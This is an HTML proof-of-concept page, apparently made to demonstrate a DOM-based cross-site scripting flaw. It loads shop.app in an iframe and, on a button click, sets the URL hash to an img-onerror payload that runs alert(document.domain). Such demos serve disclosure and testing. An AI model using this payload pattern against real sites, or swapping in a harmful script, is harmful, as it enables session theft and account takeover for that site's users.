<!DOCTYPE html>
<html>
<head>
    <title>XSS Demo</title>
    <style>
        #victimFrame { 
            width: 100%; 
            height: 500px; 
            border: 2px solid red; /* Makes it easy to see */
            margin-bottom: 10px;
        }
        #triggerButton {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h2>1. The target site is loaded below:</h2>
    <iframe id="victimFrame" src="https://shop.app/"></iframe>
    
    <br>
    <h2>2. Click the button to simulate a user clicking a malicious link on this site:</h2>
    <button id="triggerButton" onclick="triggerExploit()">Add Malicious Hash</button>

    <script>
        // The malicious payload you want to add to the URL
        const maliciousHash = "#<img src=x onerror='alert(\"XSS: \" + document.domain)'>";

        function triggerExploit() {
            const frame = document.getElementById('victimFrame');
            
            // Get the current URL of the iframe
            let currentUrl = frame.src;
            
            // Construct the new URL by appending the malicious hash
            // This uses the DOM's built-in URL handling to do it cleanly
            let newUrl = new URL(currentUrl);
            newUrl.hash = maliciousHash; // This correctly handles encoding

            // Navigate the iframe to the new URL
            frame.src = newUrl.toString();
            
            console.log("Attempting to navigate to:", newUrl.toString());
        }
    </script>
</body>
</html>
